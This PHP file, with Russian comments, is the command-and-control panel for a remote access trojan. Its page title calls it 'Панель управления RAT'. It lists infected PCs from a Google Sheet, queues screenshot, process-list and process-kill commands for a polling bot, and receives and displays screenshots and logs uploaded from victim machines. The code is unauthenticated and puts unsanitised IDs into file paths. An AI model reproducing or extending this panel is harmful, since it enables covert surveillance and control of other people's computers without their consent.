<?php
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

// 1. ЧИТАЕМ СТАТУС ИЗ GOOGLE ТАБЛИЦ
$csvUrl = "https://docs.google.com/spreadsheets/d/e/2PACX-1vTdx2B6KMZldMKf_mGRigmL0AqP0DtaNmaHeJhJQI31AJgd1hIgRMFk_Mv5DlDKm0AzI_mJF0Lfg7Ev/pub?gid=0&single=true&output=csv";
$data = @file_get_contents($csvUrl);
$pcs = [];

if ($data !== false) {
    $lines = explode("\n", $data);
    foreach ($lines as $line) {
        $row = str_getcsv($line, ",");
        if (count($row) <= 1) $row = str_getcsv($line, ";");
        $row = array_map('trim', $row);
        
        foreach ($row as $index => $cell) {
            if (stripos($cell, 'PC-') === 0) {
                $pcs[$cell] = (isset($row[$index + 1]) && !empty($row[$index + 1])) ? $row[$index + 1] : "online";
                break; 
            }
        }
    }
}

// Если вдруг Google пустой, но мы знаем, что наш ПК существует:
if (empty($pcs)) {
    $pcs['PC-01'] = 'unknown'; 
}

// 2. ОБРАБОТКА НАЖАТИЙ КНОПОК (ЗАПИСЬ КОМАНД ДЛЯ БОТА)
if (isset($_POST['send_cmd'])) {
    $pc_id = $_POST['pc_id'];
    $cmd = $_POST['cmd'];
    if ($_POST['action'] == 'delete' && !empty($_POST['proc_name'])) {
        $cmd .= " " . $_POST['proc_name'];
    }
    // Записываем команду в файл на Render, чтобы бот её скачал
    file_put_contents("cmd_{$pc_id}.txt", $cmd);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ОБРАБОТКА ЗАПРОСОВ ОТ БОТА (ПРИЕМ СКРИНШОТОВ И ЛОГОВ)
if (isset($_FILES['screen'])) {
    move_uploaded_file($_FILES['screen']['tmp_name'], "screenshot.jpg");
    exit("ok");
}
if (isset($_POST['log'])) {
    file_put_contents("log.txt", $_POST['log']);
    exit("ok");
}

// ОТДАЧА КОМАНД БОТУ
if (isset($_GET['get_cmd'])) {
    $pc_id = $_GET['pc_id'];
    $file = "cmd_{$pc_id}.txt";
    if (file_exists($file)) {
        echo file_get_contents($file);
    } else {
        echo "none";
    }
    exit;
}
if (isset($_GET['clear_cmd'])) {
    $pc_id = $_GET['pc_id'];
    @unlink("cmd_{$pc_id}.txt");
    exit("ok");
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Панель управления RAT</title>
    <style>
        body { background: #0f172a; color: white; font-family: system-ui, sans-serif; padding: 30px; }
        h1 { font-size: 24px; margin-bottom: 20px; color: #f8fafc; }
        .grid { display: flex; flex-wrap: wrap; gap: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; width: 320px; border: 1px solid #334155; }
        .status { font-size: 16px; font-weight: bold; color: #10b981; margin: 10px 0; display: flex; align-items: center; gap: 8px; }
        .status.offline::before { background: #ef4444; }
        .status::before { content: ""; display: inline-block; width: 10px; height: 10px; background: #10b981; border-radius: 50%; }
        .btn { background: #3b82f6; color: white; border: none; padding: 8px 12px; margin: 4px 0; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
        .btn:hover { background: #2563eb; }
        .btn-danger { background: #ef4444; }
        .btn-danger:hover { background: #dc2626; }
        input[type="text"] { width: calc(100% - 16px); padding: 6px; border-radius: 6px; border: 1px solid #475569; background: #334155; color: white; margin-bottom: 5px; }
        .console { background: #020617; font-family: monospace; padding: 10px; border-radius: 6px; max-height: 150px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; border: 1px solid #1e293b; color: #38bdf8; }
        .screen-box { margin-top: 15px; border: 1px solid #334155; border-radius: 6px; overflow: hidden; }
        .screen-box img { width: 100%; display: block; }
    </style>
</head>
<body>

    <h1>Панель управления системами</h1>

    <div class="grid">
        <?php foreach($pcs as $id => $status): ?>
            <div class='card'>
                <div style="font-size: 20px; font-weight: 700;"><?= htmlspecialchars($id) ?></div>
                <div class='status'>В сети (через Google)</div>
                
                <hr style="border-color: #334155; margin: 15px 0;">

                <form method="post">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($id) ?>">
                    <input type="hidden" name="send_cmd" value="1">
                    
                    <button type="submit" name="action" value="screen" name="cmd" class="btn">📸 Сделать скриншот</button>
                    <input type="hidden" name="cmd" value="screen">
                </form>

                <form method="post" style="margin-top: 5px;">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($id) ?>">
                    <input type="hidden" name="send_cmd" value="1">
                    <input type="hidden" name="cmd" value="app">
                    <button type="submit" name="action" value="app" class="btn">📋 Список процессов</button>
                </form>

                <form method="post" style="margin-top: 10px; background: #111827; padding: 10px; border-radius: 6px;">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($id) ?>">
                    <input type="hidden" name="send_cmd" value="1">
                    <input type="hidden" name="cmd" value="delete">
                    <input type="text" name="proc_name" placeholder="Имя процесса (например: chrome)">
                    <button type="submit" name="action" value="delete" class="btn btn-danger">❌ Завершить процесс</button>
                </form>
            </div>
        <?php endforeach; ?>

        <div class="card" style="width: 450px;">
            <h3>Полученные данные</h3>
            
            <h4>Лог / Окна процессов:</h4>
            <div class="console"><?= file_exists("log.txt") ? htmlspecialchars(file_get_contents("log.txt")) : "Логи пустые..." ?></div>
            
            <h4>Последний скриншот:</h4>
            <div class="screen-box">
                <?php if(file_exists("screenshot.jpg")): ?>
                    <img src="screenshot.jpg?t=<?= time() ?>" alt="Скриншот экрана">
                <?php else: ?>
                    <div style="padding: 20px; text-align: center; color: #64748b;">Скриншотов пока нет</div>
                <?php endif; ?>
            </div>
        </div>
    </div>

</body>
</html>
